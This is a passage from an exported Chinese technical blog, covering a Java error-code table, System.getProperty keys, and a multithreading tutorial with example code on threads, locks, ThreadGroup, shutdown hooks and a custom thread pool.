GAV（GroupId、ArtifactId、Version）: Maven 坐标，是用来唯一标识 jar 包。
OOP（Object Oriented Programming）:  本文泛指类、对象的编程处理方式。
AQS（AbstractQueuedSynchronizer）:  利用先进先出队列实现的底层同步工具类，它是很多上 层同步实现类的基础，比如：ReentrantLock、CountDownLatch、Semaphore 等，它们通 过继承 AQS 实现其模版方法，然后将 AQS 子类作为同步组件的内部类，通常命名为 Sync。
ORM（Object Relation Mapping）:  对象关系映射，对象领域模型与底层数据之间的转换，本 文泛指 iBATIS, mybatis 等框架。
NPE（java.lang.NullPointerException）:  空指针异常。
OOM（Out Of Memory）:  源于  java.lang.OutOfMemoryError，当  JVM  没有足够的内存 来为对象分配空间并且垃圾回收器也无法回收空间时，系统出现的严重状况。
一方库: 本工程内部子项目模块依赖的库（jar 包）。
二方库: 公司内部发布到中央仓库，可供公司内部其它应用依赖的库（jar 包）。
三方库: 公司之外的开源库（jar 包）。

附录2：错误码列表



错误码
中文描述
说明




00000
一切 ok
正确执行后的返回


A0001
用户端错误
一级宏观错误码


A0100
用户注册错误
二级宏观错误码


A0101
用户未同意隐私协议



A0102
注册国家或地区受限



A0110
用户名校验失败



A0111
用户名已存在



A0112
用户名包含敏感词



A0113
用户名包含特殊字符



A0120
密码校验失败



A0121
密码长度不够



A0122
密码强度不够



A0130
校验码输入错误



A0131
短信校验码输入错误



A0132
邮件校验码输入错误



A0133
语音校验码输入错误



A0140
用户证件异常



A0141
用户证件类型未选择



A0142
大陆身份证编号校验非法



A0143
护照编号校验非法



A0144
军官证编号校验非法



A0150
用户基本信息校验失败



A0151
手机格式校验失败



A0152
地址格式校验失败



A0153
邮箱格式校验失败



A0200
用户登录异常
二级宏观错误码


A0201
用户账户不存在



A0202
用户账户被冻结



A0203
用户账户已作废



A0210
用户密码错误



A0211
用户输入密码错误次数超限



A0220
用户身份校验失败



A0221
用户指纹识别失败



A0222
用户面容识别失败



A0223
用户未获得第三方登录授权



A0230
用户登录已过期



A0240
用户验证码错误



A0241
用户验证码尝试次数超限



A0300
访问权限异常



A0301
访问未授权



A0302
正在授权中



A0303
用户授权申请被拒绝



A0310
因访问对象隐私设置被拦截



A0311
授权已过期



A0312
无权限使用API



A0320
用户访问被拦截



A0321
黑名单用户



A0322
账号被冻结



A0323
非法IP地址



A0324
网关访问受限



A0325
地域黑名单



A0330
服务已欠费



A0340
用户签名异常



A0341
RSA签名错误



A0400
用户请求参数错误
二级宏观错误码


A0401
包含非法恶意跳转链接



A0402
无效的用户输入



A0410
请求必填参数为空



A0411
用户订单号为空



A0412
订购数量为空



A0413
缺少时间戳参数



A0414
非法的时间戳参数



A0420
请求参数值超出允许的范围



A0421
参数格式不匹配



A0422
地址不在服务范围



A0423
时间不在服务范围



A0424
金额超出限制



A0425
数量超出限制



A0426
请求批量处理总个数超出限制



A0427
请求 JSON 解析失败



A0430
用户输入内容非法



A0431
包含违禁敏感词



A0432
图片包含违禁信息



A0433
文件侵犯版权



A0440
用户操作异常



A0441
用户支付超时



A0442
确认订单超时



A0443
订单已关闭



A0500
用户请求服务异常



A0501
请求次数超出限制



A0502
请求并发数超出限制



A0503
用户操作请等待



A0504
WebSocket 连接异常



A0505
WebSocket 连接断开



A0506
用户重复请求



A0600
用户资源异常



A0601
账户余额不足



A0602
用户磁盘空间不足



A0603
用户内存空间不足



A0604
用户 OSS 容量不足



A0605
用户配额已用光



A0700
用户上传文件异常



A0701
用户上传文件类型不匹配



A0702
用户上传文件太大



A0703
用户上传图片太大



A0704
用户上传视频太大



A0705
用户上传压缩文件太大



A0800
用户当前版本异常
二级宏观错误码


A0801
用户安装版本与系统不匹配



A0802
用户安装版本过低



A0803
用户安装版本过高



A0804
用户安装版本已过期



A0805
用户 API 请求版本不匹配



A0806
用户 API 请求版本过高



A0807
用户 API 请求版本过低



A0900
用户隐私未授权
二级宏观错误码


A0901
用户隐私未签署



A0902
用户摄像头未授权



A0903
用户相机未授权



A0904
用户图片库未授权



A0905
用户文件未授权



A0906
用户位置信息未授权



A0907
用户通讯录未授权



A1000
用户设备异常
二级宏观错误码


A1001
用户相机异常



A1002
用户麦克风异常



A1003
用户听筒异常



A1004
用户扬声器异常



A1005
用户 GPS 定位异常



B0001
系统执行出错
一级宏观错误码


B0100
系统执行超时
二级宏观错误码


B0101
系统订单处理超时



B0200
系统容灾功能被触发
二级宏观错误码


B0210
系统限流



B0220
系统功能降级



B0300
系统资源异常
二级宏观错误码


B0310
系统资源耗尽



B0311
系统磁盘空间耗尽



B0312
系统内存耗尽



B0313
文件句柄耗尽



B0314
系统连接池耗尽



B0315
系统线程池耗尽



B0320
系统资源访问异常



B0321
系统读取磁盘文件失败



C0001
调用第三方服务出错
一级宏观错误码


C0100
中间件服务出错
二级宏观错误码


C0110
RPC 服务出错



C0111
RPC 服务未找到



C0112
RPC 服务未注册



C0113
接口不存在



C0120
消息服务出错



C0121
消息投递出错



C0122
消息消费出错



C0123
消息订阅出错



C0124
消息分组未查到



C0130
缓存服务出错



C0131
key 长度超过限制



C0132
value 长度超过限制



C0133
存储容量已满



C0134
不支持的数据格式



C0140
配置服务出错



C0150
网络资源服务出错



C0151
VPN 服务出错



C0152
CDN 服务出错



C0153
域名解析服务出错



C0154
网关服务出错



C0200
第三方系统执行超时
二级宏观错误码


C0210
RPC 执行超时



C0220
消息投递超时



C0230
缓存服务超时



C0240
配置服务超时



C0250
数据库服务超时



C0300
数据库服务出错
二级宏观错误码


C0311
表不存在



C0312
列不存在



C0321
多表关联中存在多个相同名称的列



C0331
数据库死锁



C0341
主键冲突



C0400
第三方容灾系统被触发
二级宏观错误码


C0401
第三方系统限流



C0402
第三方功能降级



C0500
通知服务出错
二级宏观错误码


C0501
短信提醒服务失败



C0502
语音提醒服务失败



C0503
邮件提醒服务失败




]]></content>
      <categories>
        <category>后端</category>
        <category>编程规范</category>
      </categories>
      <tags>
        <tag>编程规范</tag>
      </tags>
  </entry>
  <entry>
    <title>系统方法：System.getProperty</title>
    <url>/20221027/80d3479f.html</url>
    <content><![CDATA[


code
说明




java.versionJava
运行时环境版本


java.vendorJava
运行时环境供应商


java.vendor.urlJava
供应商的URL


java.homeJava
安装目录


java.vm.specification.versionJava
虚拟机规范版本


java.vm.specification.vendorJava
虚拟机规范供应商


java.vm.specification.nameJava
虚拟机规范名称


java.vm.versionJava
虚拟机实现版本


java.vm.vendorJava
虚拟机实现供应商


java.vm.nameJava
虚拟机实现名称


java.specification.versionJava
运行时环境规范版本


java.specification.vendorJava
运行时环境规范供应商


java.specification.nameJava
运行时环境规范名称


java.class.versionJava
类格式版本号


java.class.pathJava
类路径


java.library.path
加载库时搜索的路径列表


java.io.tmpdir
默认的临时文件路径


java.compiler
要使用的JIT编译器的名称


java.ext.dirs
一个或多个扩展目录的路径


os.name
操作系统的名称


os.arch
操作系统的架构


os.version
操作系统的版本


file.separator
文件分隔符（在UNIX系统中是“/”）


path.separator
路径分隔符（在UNIX系统中是“:”）


line.separator
行分隔符（在UNIX系统中是“/n”）


user.name
用户的账户名称


user.home
用户的主目录


user.dir
用户的当前工作目录



]]></content>
      <categories>
        <category>后端</category>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>多线程基础</title>
    <url>/20221101/53471b9a.html</url>
    <content><![CDATA[Chapter1：快速认识线程
继承Thread类创建线程类（模板设计模式）
（1）定义Thread类的子类，并重写该类的run方法，该run方法的方法体就代表了线程要完成的任务。因此把run()方法称为执行体。
（2）创建Thread子类的实例，即创建了线程对象。
（3）调用线程对象的start()方法来启动该线程。
import java.util.concurrent.atomic.AtomicInteger;// 定义Thread类的子类，并重写该类的run方法public class TicketWindow extends Thread {    private final int MAX = 50;    private static AtomicInteger index = new AtomicInteger(0);    private String name;    public TicketWindow(String name) {        this.name = name;    }    @Override    public void run() {        while (index.get() &lt;= MAX) {            System.out.println("柜台：" + name + "当前的号码是：" + index.addAndGet(1));        }    }}
@Testpublic void bankTest1() {  // step2：创建Thread子类的实例，即创建了线程对象  TicketWindow ticketWindow1 = new TicketWindow("一号");  // step3: 调用线程对象的start()方法来启动该线程  ticketWindow1.start();  TicketWindow ticketWindow2 = new TicketWindow("二号");  ticketWindow2.start();  TicketWindow ticketWindow3 = new TicketWindow("三号");  ticketWindow3.start();  TicketWindow ticketWindow4 = new TicketWindow("四号");  ticketWindow4.start();}
通过Runnable接口创建线程类（策略模式的应用）
为了将可执行的控制单元和线程控制分割开来
（1）定义runnable接口的实现类，并重写该接口的run()方法，该run()方法的方法体同样是该线程的线程执行体。
（2）创建 Runnable实现类的实例，并依此实例作为Thread的target来创建Thread对象，该Thread对象才是真正的线程对象。
（3）调用线程对象的start()方法来启动该线程。
public class TickWindowRunnable implements Runnable {    private final int MAX = 50;    private int index = 1;    @Override    public void run() {        while (index &lt;= MAX) {            System.out.println(Thread.currentThread().getName() + "的号码是：" + index++);        }    }}
@Testpublic void bankTest2() {  TickWindowRunnable ticketWindowRunnable = new TickWindowRunnable();  Thread ticketWindow1 = new Thread(ticketWindowRunnable, "一号");  Thread ticketWindow2 = new Thread(ticketWindowRunnable, "二号");  Thread ticketWindow3 = new Thread(ticketWindowRunnable, "三号");  Thread ticketWindow4 = new Thread(ticketWindowRunnable, "四号");  ticketWindow1.start();  ticketWindow2.start();  ticketWindow3.start();  ticketWindow4.start();}//java8改造 @Testpublic void bankTest3() {  final int MAX = 50;  final AtomicInteger index = new AtomicInteger(0);  final Runnable runnable = () -&gt; {    while (index.get() &lt;= MAX) {      System.out.println(Thread.currentThread().getName() + "的号码是：" + index.addAndGet(1));    }  };  Thread ticketWindow1 = new Thread(runnable, "一号");  Thread ticketWindow2 = new Thread(runnable, "二号");  Thread ticketWindow3 = new Thread(runnable, "三号");  Thread ticketWindow4 = new Thread(runnable, "四号");  ticketWindow1.start();  ticketWindow2.start();  ticketWindow3.start();  ticketWindow4.start();}
Chapter2：深入理解Thread的构造函数



序号
方法
说明




1
Thread()
Allocates a new Thread object.


2
Thread(Runnable target)
Allocates a new Thread object.


3
Thread(Runnable target, String name)
Allocates a new Thread object.


4
Thread(String name)
Allocates a new Thread object.


5
Thread(ThreadGroup group, Runnable  target)
Allocates a new Thread object.


6
Thread(ThreadGroup group, Runnable  target, String name)
Allocates a new Thread object so that it has target as its run object,  has the specified name as its name, and belongs to the thread group referred  to by group.


7
Thread(ThreadGroup group, Runnable  target, String name, long stackSize)
Allocates a new Thread object so that it has target as its run object,  has the specified name as its name, and belongs to the thread group referred  to by group, and has the specified stack size.


8
Thread(ThreadGroup group, String  name)
Allocates a new Thread object.



Thread命名


默认线程名称，按照编号，从0开始递增。线程一旦启动，线程名不可再进行更改。
public Thread() {  init(null, null, "Thread-" + nextThreadNum(), 0);}


Thread和ThreadGroup

main线程所在的ThreadGroup称为main
构造一个线程如果没有显示的指定ThreadGroup，他将和父线程在同一个ThreadGroup

Thread和stackSize
/*** 测试默认栈深度 */public class TestStack {    private int counter = 0;    private void recur() {        counter++;        recur();//递归    }    public void getStackDepth() {        try {            recur();        } catch (Throwable t) {            System.out.println("栈最大深度：" + counter);            t.printStackTrace();        }    }    public static void main(String[] args) {        TestStack stack = new TestStack();        stack.getStackDepth();    }}结果：18368  # 查看配置jinfo -flag ThreadStackSize  16320
守护线程
设置守护线程的方法很简单，调用setDaemon方法即可，true代表守护线程，false代表正常线程。
线程是否为守护线程和它的父线程有很大的关系，如果父线程是正常线程，则子线程也是正常线程，反之亦然，如果你想要修改它的特性则可以借助方法。
isDaemon方法可以判断该线程是不是守护线程。
另外需要注意的就是，setDaemon方法只在线程启动之前才能生效，如果一个线程已经死亡，那么再设置setDaemon则会抛出IllegalThreadStateException异常。
Chapter3： Thread API
public final void setName(String name) // 设置线程名称public final void setPriority(int newPriority) // 设置线程优先级
join()
public final void join()  // 主线程等待线程threadTest1、threadTest2执行完成// threadTest1、threadTest2 交替执行threadTest1.join();threadTest2.join();// 以下写法，main 线程等待main 线程结束，所有程序一直处于等待状态，无法终止。public static void main(String[] args) throws Exception{  Thread.currentThread().join();}
interrupt()
如下方法的调用会使得当前线程进人阻塞状态，而调用当前线程的interrupt方法，就可以打断阻塞。
join()、sleep()、wait()...
上述若干方法都会使得当前线程进人阻塞状态，若另外的一个线程调用被阻塞线程的interrupt方法，则会打断这种阻塞，因此这种方法有时会被称为可中断方法。
==打断一个线程并不等于该线程的生命周期结束，仅仅是打断了当前线程的阻塞状态==。
一旦线程在阻塞的情况下被打断，都会抛出一个称为InterruptedException的异常，这个异常就像一个signal（信号）一样通知当前线程被打断了。
合理关闭一个线程


利用中断信号
public static void main(String[] args) throws InterruptedException {	Thread t1 = new Thread() {		@Override		public void run() {			System.out.println("I will start work.");			while (!isInterrupted()) {				// working			}			System.out.println("I will be exiting.");		}	};	t1.start();	TimeUnit.MINUTES.sleep(1);	System.out.println("System will be shutdown");	t1.interrupt();}


利用Volatile开关变量控制
public class StopThread {    static class MyThread extends Thread {        private volatile boolean shutdown = false;        @Override        public void run() {            System.out.println("I will start work.");            while (!shutdown) {                // working            }            System.out.println("I will be exiting.");        }        public void shutdown() {            this.shutdown = true;        }    }    public static void main(String[] args) throws InterruptedException {        MyThread t1 = new MyThread();        t1.start();        TimeUnit.SECONDS.sleep(10);        System.out.println("System will be shutdown");        t1.shutdown();    }}


耗时时间过长，强制退出线程（将执行程序设置为守护线程）

使用执行线程的守护线程执行程序任务

public class ThreadService {  private Thread executeThead;  private boolean finished = false;  public void execute(Runnable task) {    executeThead = new Thread() {      @Override      public void run() {        Thread runner = new Thread(task);        runner.setDaemon(true);        runner.start();        try {          // 等待runner执行完成          runner.join();          finished = true;        } catch (InterruptedException e) {          // 执行被打断          System.out.println("执行任务的守护线程被打断");          e.printStackTrace();        }      }    };    executeThead.start();  }  public void shutdown(long miles) {    long currentTime = System.currentTimeMillis();    while (!finished) {      if (System.currentTimeMillis() - currentTime &gt;= miles) {        System.out.println("执行任务超时");        executeThead.interrupt();        break;      }      try {        // 短暂休眠，减少执行次数        Thread.sleep(1);      } catch (InterruptedException e) {        System.out.println("执行线程被打断");        e.printStackTrace();      }    }  }}

调用执行线程

public class ThreadCloseForce {  public static void main(String[] args) {    ThreadService threadService = new ThreadService();    long start = System.currentTimeMillis();    // 启动执行线程    threadService.execute(() -&gt; {      while (true) {        // 模拟线程阻塞      }    });    // 超时验证    threadService.shutdown(10_000);    long end = System.currentTimeMillis();    System.out.println(end - start);  }}

执行结果

执行任务超时10117执行任务的守护线程被打断java.lang.InterruptedException	at java.lang.Object.wait(Native Method)	at java.lang.Thread.join(Thread.java:1252)	at java.lang.Thread.join(Thread.java:1326)	at com.hots.part1.chapter3.ThreadService$1.run(ThreadService.java:16)Process finished with exit code 0


Chapter4：线程安全与数据同步
synchronized关键字

使用synchronized需要注意的问题


与monitor关联的对象不可为空


synchronized的作用域不可太大（降低执行效率）


不同的monitor企图锁住相同的方法


多个锁导致死锁



this monitor 和 class monitor


使用synchronized同步一个类的不同方法，争抢的是同一个锁（方法所属的对象的锁）：synchronied(this)
官方说明：
When a thread invokes a synchronized method, it automatically acquires the intrinsic lock for that method's object and releases it when the method returns. The lock release occurs even if the return vas caused by an uncaught exception.


使用synchronized同步一个类的不同静态方法，争抢的是同一个锁（类的class锁）：synchronied(Test.class)
官方说明：
since a static method is associated with a class, not an object.In this case, the thread acquires the intrinsic lock for the Class object associated with the class. Thus access to class'S static fields is controlled by a lock that's distinct from the lock for any instance of the class.


Chapter5：线程之间的通信
wait 、notify、notifyAll
wait 和 sleep和区别
从表面上看，wait和sleep方法都可以使当前线程进人阻塞状态，但是两者之间存在着本质的区别，下面我们将总结两者的区别和相似之处

wait和sleep方法都可以使线程进人阻塞状态
wait和sleep方法均是可中断方法，被中断后都会收到中断异常。
wait是Object的方法，而sleep是Thread特有的方法
wait方法的执行必须在同步方法中进行，而sleep则不需要。
线程在同步方法中执行sleep方法时，并不会释放的锁，而wait方法则会释放monitor的锁
sleep方法短暂休眠之后会主动退出阻塞，而wait方法（没有指定wait时间）则需要被其他线程中断后才能退出阻塞。

单线程通信
public class ProducerAndConsumerVersion1 {    private int i = 0;    private volatile boolean isProduced = false;    private final Object LOCK = new Object();    private void produce() {        synchronized (LOCK) {            if (isProduced) {                try {                    LOCK.wait();                } catch (InterruptedException e) {                    e.printStackTrace();                }            } else {                ++i;                System.out.println(Thread.currentThread().getName() + "：produced-&gt;" + i);                LOCK.notify();                isProduced = true;            }        }    }    private void consume() {        synchronized (LOCK) {            if (isProduced) {                System.out.println(Thread.currentThread().getName() + "：consumed-&gt;" + i);                LOCK.notify();                isProduced = false;            } else {                try {                    LOCK.wait();                } catch (InterruptedException e) {                    e.printStackTrace();                }            }        }    }    public static void main(String[] args) {        ProducerAndConsumerVersion1 producerAndConsumerVersion1 = new ProducerAndConsumerVersion1();        new Thread("P1") {            @Override            public void run() {                while (true) {                    producerAndConsumerVersion1.produce();                }            }        }.start();        new Thread("C1") {            @Override            public void run() {                while (true) {                    producerAndConsumerVersion1.consume();                }            }        }.start();    }}
多线程通信


/** * Demo */public class ProducerAndConsumerVersion3 {    private int i = 0;    private volatile boolean isProduced = false;    private final Object LOCK = new Object();    private void produce() {        synchronized (LOCK) {            while (isProduced) {                try {                    LOCK.wait();                    System.out.println(Thread.currentThread().getName() + "：wait");                } catch (InterruptedException e) {                    e.printStackTrace();                }            }            ++i;            System.out.println(Thread.currentThread().getName() + "：produced-&gt;" + i);            isProduced = true;            LOCK.notifyAll();        }    }    private void consume() {        synchronized (LOCK) {            while (!isProduced) {                try {                    LOCK.wait();                    System.out.println(Thread.currentThread().getName() + "：wait");                } catch (InterruptedException e) {                    e.printStackTrace();                }            }            System.out.println(Thread.currentThread().getName() + "：consumed-&gt;" + i);            isProduced = false;            LOCK.notifyAll();        }    }    public static void main(String[] args) {        ProducerAndConsumerVersion3 producerAndConsumerVersion3 = new ProducerAndConsumerVersion3();        Stream.of("P1", "P2").forEach(name -&gt; {            new Thread(name) {                @Override                public void run() {                    while (true) {                        producerAndConsumerVersion3.produce();                        try {                            Thread.sleep(10);                        } catch (Exception e) {                            e.printStackTrace();                        }                    }                }            }.start();        });        Stream.of("C1", "C2", "C3", "C4").forEach(name -&gt; {            new Thread(name) {                @Override                public void run() {                    while (true) {                        producerAndConsumerVersion3.consume();                        try {                            Thread.sleep(100);                        } catch (Exception e) {                            e.printStackTrace();                        }                    }                }            }.start();        });    }}
自定义显示锁

Lock接口

import java.util.Collection;public interface Lock {    void lock() throws InterruptedException;    void lock(long mills) throws InterruptedException, TimeoutException;    void unLock();    Collection&lt;Thread&gt; getBlockedThread();    int getBlockedSize();    class TimeoutException extends Exception {        public TimeoutException(String message) {            super(message);        }    }}

接口实现

import java.util.ArrayList;import java.util.Collection;import java.util.Collections;public class BooleanLock implements Lock {    private boolean initValue = false;    private Thread currentThread;    private Collection&lt;Thread&gt; blockedThreadCollection = new ArrayList&lt;&gt;();    @Override    public synchronized void lock() throws InterruptedException {        while (initValue) {            blockedThreadCollection.add(Thread.currentThread());            this.wait();        }        initValue = true;        currentThread = Thread.currentThread();        blockedThreadCollection.remove(Thread.currentThread());    }    @Override    public synchronized void lock(long mills) throws InterruptedException, TimeoutException {        if (mills &lt;= 0) {            lock();        }        long waitMills = mills;        long endTime = System.currentTimeMillis() + waitMills;        while (initValue) {            if (waitMills &lt;= 0) {                throw new TimeoutException(Thread.currentThread().getName() + " waiting timeout");            }            // 重新设置等待时间            this.wait(waitMills);            waitMills = endTime - System.currentTimeMillis();        }        this.initValue = true;        this.currentThread = Thread.currentThread();    }    @Override    public synchronized void unLock() {        if (Thread.currentThread() == currentThread) {            initValue = false;            System.out.println(Thread.currentThread().getName() + " release the monitor");            this.notifyAll();        }    }    @Override    public Collection&lt;Thread&gt; getBlockedThread() {        return Collections.unmodifiableCollection(blockedThreadCollection);    }    @Override    public int getBlockedSize() {        return blockedThreadCollection.size();    }}

调用

import java.util.Arrays;public class BooleanLockTest {    public static void main(String[] args) {        final BooleanLock booleanLock = new BooleanLock();        Arrays.asList("W1", "W2", "W3").stream()                .forEach(name -&gt; {                    new Thread(() -&gt; {                        try {                            booleanLock.lock(5_000);                            System.out.println(Thread.currentThread().getName() + " got the lock");                            work();                        } catch (InterruptedException | Lock.TimeoutException e) {                            e.printStackTrace();                        } finally {                            booleanLock.unLock();                        }                    }, name).start();                });    }    public static void work() throws InterruptedException {        System.out.println(Thread.currentThread().getName() + " is working...");        Thread.sleep(10_000);    }}
Chapter6：Thread Group
Thread 与 ThreadGroup

基本操作



方法
说明




activeCount()
用于获取group中活跃的线程，这只是个估计值，并不能百分之百地保证数字一定正确，原因前面已经分析过，该方法会递归获取其他子group中的活跃线程。


activeGroupCount()
用于获取group中活跃的子group，这也是一个近似估值，该方法也会递归获取所有的子group。


getMaxPriority()
用于获取group的优先级，默认情况下，Group的优先级为10，在该group中，所有线程的优先级都不能大于group的优先级


getName()
用于获取group的名字。


getParent()
用于获取group的父group，如果父group不存在，则会返回null，比如systemgroup的父group就为null。


list()
该方法没有返回值，执行该方法会将group中所有的活跃线程信息全部输出到控制台，也就是System.out0


parentOf(ThreadGroup g)
会判断当前group是不是给定group的父group，另外如果给定的group就是自己本身，那么该方法也会返回true。


setMaxPriority(int pri)
会指定group的最大优先级，最大优先级不能超过父group的最大优先级，执行该方法不仅会改变当前group的最大优先级，还会改变所有子group的最大优先级



守护ThreadGroup
public final void setDaemon(boolean daemon)
First, the checkAccess method of this thread group is called with no arguments; this may result in a security exception.A daemon thread group is automatically destroyed when its last thread is stopped or its last thread group is destroyed
/** * Demo */public class ThreadGroupApi {    public static void main(String[] args) throws InterruptedException {        ThreadGroup tg1 = new ThreadGroup("group1");        new Thread(tg1, () -&gt; {            try {                Thread.sleep(1_000);            } catch (InterruptedException e) {                e.printStackTrace();            }        }, "group1-t1").start();        ThreadGroup tg2 = new ThreadGroup("group2");        new Thread(tg2, () -&gt; {            try {                Thread.sleep(1_000);            } catch (InterruptedException e) {                e.printStackTrace();            }        }, "group2-t1").start();        tg2.setDaemon(true);        Thread.sleep(1_000);        System.out.println(tg1.getName() + " -- " + tg1.isDestroyed());// false        System.out.println(tg2.getName() + " -- " + tg2.isDestroyed());// true              tg1.destroy(); // 显示销毁        System.out.println(tg1.getName() + " -- " + tg1.isDestroyed());// true        System.out.println(tg2.getName() + " -- " + tg2.isDestroyed());// true    }}
Chapter7：Hook线程以及捕获线程执行异常
获取线程运行时异常
处理Thread运行时异常API，有四个



方法
说明




public static void  setDefaultUncaughtExceptionHandler(Thread.UncaughtExceptionHandler eh)
设置全局的UncaughtExceptionHandler


public static  Thread.UncaughtExceptionHandler getDefaultUncaughtExceptionHandler()
获取全局的UncaughtExceptionHandler


public void  setUncaughtExceptionHandler(Thread.UncaughtExceptionHandler eh)
为某个特定线程指定UncaughtExceptionHandler


public Thread.UncaughtExceptionHandler  getUncaughtExceptionHandler()
获取某个特定线程指定UncaughtExceptionHandler



其中UncaughtExceptionHandler 是一个FunctionalInterface接口，仅包含一个抽象方法。
@FunctionalInterfacepublic interface UncaughtExceptionHandler {  /**         * Method invoked when the given thread terminates due to the         * given uncaught exception.         * &lt;p&gt;Any exception thrown by this method will be ignored by the         * Java Virtual Machine.         * @param t the thread         * @param e the exception         */  void uncaughtException(Thread t, Throwable e);}
该回调接口会被Thread和dispatchUncaughtException调用。
/** * Dispatch an uncaught exception to the handler. This method is * intended to be called only by the JVM. */private void dispatchUncaughtException(Throwable e) {  getUncaughtExceptionHandler().uncaughtException(this, e);}
UncaughtExceptionHandler实例
测试类
public class CaptureThreadException {    public static void main(String[] args) {        // 1. 设置回调接口        Thread.setDefaultUncaughtExceptionHandler((t, e) -&gt; {            System.out.println(t.getName() + " ----- occur exception：" + e.getMessage());            e.printStackTrace();        });        new Thread(() -&gt; {            try {                Thread.sleep(1_000);            } catch (InterruptedException e) {                e.printStackTrace();            }            // 2. 抛出运行时异常            System.out.println(1 / 0);        }).start();    }}
输出结果
Thread-0 ----- occur exception：/ by zerojava.lang.ArithmeticException: / by zero	at com.hots.chapter7.CaptureThreadException.lambda$main$1(CaptureThreadException.java:20)	at java.lang.Thread.run(Thread.java:748)Process finished with exit code 0
UncaughtExceptionHandler源码分析


获取Thread的UncaughtExceptionHandler
private void dispatchUncaughtException(Throwable e) {  getUncaughtExceptionHandler().uncaughtException(this, e);}


Thread未设置UncaughtExceptionHandler，则找ThreadGroup获取
public UncaughtExceptionHandler getUncaughtExceptionHandler() {  return uncaughtExceptionHandler != null ?    uncaughtExceptionHandler : group;}

ThreadGroup 是 Thread.UncaughtExceptionHandler 的实现类



ThreadGroup的uncaughtException
public void uncaughtException(Thread t, Throwable e) {	if (parent != null) {		parent.uncaughtException(t, e); // 调用父ThreadGroup的uncaughtException	} else {		Thread.UncaughtExceptionHandler ueh =			Thread.getDefaultUncaughtExceptionHandler(); 		if (ueh != null) {			ueh.uncaughtException(t, e); // 调用全局默认的UncaughtExceptionHandler		} else if (!(e instanceof ThreadDeath)) {			System.err.print("Exception in thread \"" + t.getName() + "\" ");			e.printStackTrace(System.err);// 将异常的堆栈信息定向到System.err中		}	}}


   graph LR
   A[线程异常] --&gt;  B(MainGroup) --&gt; C(System Group) --&gt; D[System.err]
注入Hook线程
Hook线程概念
JVM进程的退出是由于JVM进程中没有活跃的非守护线程，或者收到了系统中断信号。
向JVM程序注入一个Hook线程，在JVM进程退出的时候，Hook线程会启动执行。
通过Runtime可以为JVM注人多个Hook线程。
Linux 模拟Hook简单调用
==Runtime.getRuntime().addShutdownHook(Thread hook));==
[root@hots java]# mkdir /root/java[root@hots java]# vi ExitCapture.java #内容如下
public class ExitCapture{	public static void main(String[] args){    		Runtime.getRuntime().addShutdownHook(new Thread(() -&gt; {			System.out.println(Thread.currentThread().getName() + " exiting......");      // 进程down之前的安全处理措施			notifyAndRelease();		}));    		int i = 0;		while(true){			++i;			try{				Thread.sleep(1_000L);				System.out.println(Thread.currentThread().getName() + " working....");			} catch (Throwable e) {			}			if (i &gt; 10) {				throw new RuntimeException(Thread.currentThread().getName() + " error");			}		}	}		private static void notifyAndRelease(){		System.out.println(Thread.currentThread().getName() + " notify other matchine and release resource");		try {			Thread.sleep(1_000L);		} catch(Exception e) {			}		System.out.println(Thread.currentThread().getName() + "finish exit.");	}}  
[root@hots java]# javac ExitCapture.java[root@hots java]# java ExitCapture

# 后台运行，日志记录到nohup.out文件
nohup java -cp . ExitCapture &amp;

10秒后程序退出 / Ctrl+C 退出程序 / kill 进程号
[root@hots java]# java ExitCapture  main working....main working....main working....main working....main working....main working....^CThread-0 exiting......Thread-0 notify other matchine and release resourcemain working....Thread-0finish exit.[1]+  Exit 1              

kill -9 进程号 会直接退出，钩子程序不会执行。

Hook线程实际应用举例
在我们的开发中经常会遇到Hook线程，比如为了防止某个程序被重复启动，在进程启动时会创建一个文件，进程收到中断信号的时候会删除这个lock文件，我们在MySQL服务器、zookeeper、kafka等系统中都能看到lock文件的存在。
import java.io.IOException;import java.nio.file.Files;import java.nio.file.Path;import java.nio.file.Paths;public class PreventDuplicated {    private static final String LOCK_PATH = "E:\\Downloads";    private static final String LOCK_FILE = ".lock";    private static final String PERMISSIONS = "rw-------";    public static void main(String[] args) {        Runtime.getRuntime().addShutdownHook(new Thread(() -&gt; {            // 程序退出，删除lock文件            System.out.println("deal program shutdown...");            getLockFile().toFile().delete();        }));        // 判断Lock文件，存在，抛重复执行异常，不存在继续        checkLockFile();        //程序执行        try {            Thread.sleep(20_000);        } catch (InterruptedException e) {            e.printStackTrace();        }    }    private static void checkLockFile() {        Path path = getLockFile();        if (path.toFile().exists()) {            throw new RuntimeException("The program already running.");        }        try {            Files.createFile(path);        } catch (IOException e) {            e.printStackTrace();        }    }    private static Path getLockFile() {        return Paths.get(LOCK_PATH, LOCK_FILE);    }}
Chapter8：线程池原理以及自定义线程池
import java.util.ArrayList;import java.util.Iterator;import java.util.LinkedList;import java.util.List;/** * 线程池模拟类  */public class SimpleThreadPool extends Thread {    /* 线程池现有容量：包含FREE, RUNNING, BLOCKED 三种状态的线程 */    private int poolSize;    private static volatile int seq = 0;    private static final String THREAD_PREFIX = "SIMPLE_THREAD_POOL-";    private final int queueSize;    /* 默认TASK_QUEUE的阈值 */    public final static int DEFAULT_TASK_QUEUE_SIZE = 2000;    private final static LinkedList&lt;Runnable&gt; TASK_QUEUE = new LinkedList&lt;&gt;();    private final static ThreadGroup GROUP = new ThreadGroup("Pool_Group");    private final static List&lt;MyThread&gt; THREAD_QUEUE = new ArrayList&lt;&gt;();    private final DiscardPolicy discardPolicy;    // 线程池，无能力处理，策略    public final static DiscardPolicy DEFAULT_DISCARD_POLICY = () -&gt; {        throw new DiscardException("Discard this task");    };    // 线程池，销毁标记    private volatile boolean destroy = false;    private final int minPoolSize;    public static final int DEFAULT_MIN_POOL_SIZE = 4;    private final int activePoolSize;    public static final int DEFAULT_ACTIVE_POOL_SIZE = 8;    private final int maxPoolSize;    public static final int DEFAULT_MAX_POOL_SIZE = 12;    public SimpleThreadPool() {        this(DEFAULT_MIN_POOL_SIZE, DEFAULT_ACTIVE_POOL_SIZE, DEFAULT_MAX_POOL_SIZE, DEFAULT_TASK_QUEUE_SIZE, DEFAULT_DISCARD_POLICY);    }    public SimpleThreadPool(int minPoolSize, int activePoolSize, int maxPoolSize, int queueSize, DiscardPolicy discardPolicy) {        this.minPoolSize = minPoolSize;        this.activePoolSize = activePoolSize;        this.maxPoolSize = maxPoolSize;        this.queueSize = queueSize;        this.discardPolicy = discardPolicy;        // 初始化，最小容量线程池        for (int i = 0; i &lt; minPoolSize; i++) {            createMyThread();        }        // 自定义线程池，同时也是一个线程，可以根据工作量，自动调整容量        